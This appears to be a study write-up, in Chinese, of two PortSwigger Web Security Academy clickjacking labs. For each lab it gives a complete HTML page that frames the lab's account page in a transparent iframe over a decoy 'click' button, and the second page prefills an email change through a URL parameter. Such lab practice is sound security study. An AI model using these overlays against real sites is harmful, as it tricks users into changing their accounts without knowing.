---
title: PortSwigger Clickjacking
description: PortSwigger Clickjacking
---

## Lab: Basic clickjacking with CSRF token protection

| Dimension | Description                                                                                    |
| --------- | ---------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#how-to-construct-a-basic-clickjacking-attack |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected                     |

基礎題，就是單純考驗 CSS 切版能力

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 600px;
        z-index: 1;
        opacity: 0.0001;
      }
      div {
        position: absolute;
        top: 485px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a8f009a040328ad8290936800c200c7.web-security-academy.net/my-account"
    ></iframe>
    <div>click</div>
  </body>
</html>
```

## Lab: Clickjacking with form input data prefilled from a URL parameter

| Dimension | Description                                                                              |
| --------- | ---------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/clickjacking#clickjacking-with-prefilled-form-input |
| Lab       | https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input               |

基礎題，跟上一題比起來，就是多了一個 `?email=wiener4@normal-user.net` 的 querystring

```html
<html>
  <head></head>
  <body>
    <style>
      html,
      body {
        margin: 0;
        padding: 0;
      }
      iframe {
        position: absolute;
        width: 500px;
        height: 500px;
        z-index: 1;
      }
      div {
        position: absolute;
        top: 450px;
        left: 50px;
        z-index: 0;
      }
    </style>
    <iframe
      src="https://0a280028033be4478041941b0035007f.web-security-academy.net/my-account?email=wiener4@normal-user.net"
    ></iframe>
    <div>Click me</div>
  </body>
</html>
```

## 參考資料

- https://portswigger.net/web-security/clickjacking
